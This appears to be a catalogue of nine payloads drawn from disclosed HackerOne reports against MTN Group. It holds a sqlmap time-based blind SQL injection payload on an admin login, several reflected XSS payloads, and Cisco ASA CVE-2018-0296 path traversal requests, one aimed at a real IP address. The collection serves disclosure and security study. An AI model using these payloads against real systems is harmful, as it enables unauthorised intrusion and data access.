# MTN Group

9 payloads.

### `43e07acc`

```
[*] starting @ 21:06:44 /2020-05-03/

[18:05:44] [INFO] parsing HTTP request from 'post'
[18:06:10] [INFO] resuming back-end DBMS 'mysql' 
[18:06:24] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: login (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: login=admin' AND (SELECT 5206 FROM (SELECT(SLEEP(5)))THtF) AND 'MHhg'='MHhg&pass=admin
---
[18:06:45] [INFO
```

**Parameter:** `login`
— [SQL Injection on the administrator panel](https://hackerone.com/reports/865436) · MTN Group · [z3lox](https://hackerone.com/z3lox)

### `8805a004`

```
GET /header.aspx HTTP/1.1
Host: evil.com
https://target.com/search?hl=en&q=testing'"()&%"><img src=x onerror=alert(document.domain)>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _ga=GA1.1.535977033.1609258177; _gid=GA1.3.1739427388.1609466879; ASP.NET_SessionId=31wr
```

**Parameter:** `q`
— [Reflected XSS on target.com.g](https://hackerone.com/reports/1069528) · MTN Group · [lu3ky-13](https://hackerone.com/lu3ky-13)

### `ad0f1eee`

```
http://target.com/search/suggest/q/xss<img%20src=x%20onerror=alert()>1337
```

**Parameter:** `q`
— [XSS at http://target.com/search/suggest/q/{xss payload}](https://hackerone.com/reports/1244722) · MTN Group · [homosec](https://hackerone.com/homosec)

### `d28037af`

```
4. in file upload upload any photo with payload file name : "><img src=x onerror=alert(document.cookie);.jpg
```

**Parameter:** `filename`
— [Reflected Cross-Site scripting in : target.com](https://hackerone.com/reports/1264832) · MTN Group · [alimanshester](https://hackerone.com/alimanshester)

### `2999c6c6`

```
* <h1 onauxclick=confirm(document.domain)>RIGHT CLICK HERE
```

— [Reflected - XSS](https://hackerone.com/reports/1779447) · MTN Group · [vidaamuyarchi](https://hackerone.com/vidaamuyarchi)

### `25149479`

```
https://102.176.160.119:10443/remote/error?errmsg=--%3E%3Cscript%3Ealert(document.domain
```

**Parameter:** `errmsg`
— [Reflected cross site scripting (XSS) attacks Reflected XSS attacks, ](https://hackerone.com/reports/1799197) · MTN Group · [0xmr_b4rayz](https://hackerone.com/0xmr_b4rayz)

### `113bdbfb`

```
https://target.com/nin/success?message=lol&nin=<script
```

**Parameter:** `nin`
— [Reflected XSS in https://target.com/nin/success?message=lol&nin=<VULNERABLE>](https://hackerone.com/reports/2039384) · MTN Group · [hazemhussien99](https://hackerone.com/hazemhussien99)

### `fcc45cbe`

```
target.com/+CSCOU+/../+CSCOE+/files/file_list.json
```

— [CVE-2018-0296 Cisco ASA Denial of Service & Path Traversal vulnerable on \[target.com\]](https://hackerone.com/reports/2375666) · MTN Group · [deb0con](https://hackerone.com/deb0con)

### `4eda065f`

```
https://target.com/+CSCOU+/../+CSCOE+/files/file_list.json?path=%2bCSCOE%2b
```

**Parameter:** `path`
— [CVE-2018-0296 Cisco ASA Denial of Service & Path Traversal vulnerable on \[target.com\]](https://hackerone.com/reports/2375666) · MTN Group · [deb0con](https://hackerone.com/deb0con)
